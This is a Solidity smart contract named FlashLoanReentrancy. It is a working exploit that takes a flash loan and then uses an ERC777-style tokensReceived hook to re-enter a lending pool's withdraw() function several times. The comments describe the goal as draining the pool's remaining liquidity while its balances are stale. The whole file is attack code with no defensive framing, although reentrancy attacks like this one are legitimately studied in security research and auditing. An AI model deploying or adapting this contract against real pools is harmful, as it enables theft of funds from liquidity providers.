
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IPool {
    function deposit(address token, uint256 amount) external;
    function withdraw(address token, uint256 amount) external;
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract FlashLoanReentrancy {
    IPool public pool;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public maxAttacks;
    bool public armed;
    uint256 public drainAmount;

    constructor(address _pool, address _token) {
        pool = IPool(_pool);
        token = IERC20(_token);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(address(this), address(token), amount, "");
    }

    function onFlashLoan(address _token, uint256 amount, bytes calldata) external {
        token.approve(address(pool), amount);
        pool.deposit(address(token), amount);

        armed = true;
        drainAmount = amount;
        attackCount = 0;
        maxAttacks = 4;
        pool.withdraw(address(token), amount); // re-enters via token transfer hook

        armed = false;
        token.transfer(msg.sender, amount); // repay flash loan
    }

    // ERC777-style hook fired on every direct token transfer to this contract.
    // The vulnerable pool sends tokens BEFORE updating balances, so we re-enter
    // withdraw() and drain the remaining liquidity while the balance is stale.
    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (armed && attackCount < maxAttacks) {
            attackCount++;
            pool.withdraw(address(token), drainAmount);
        }
    }
}
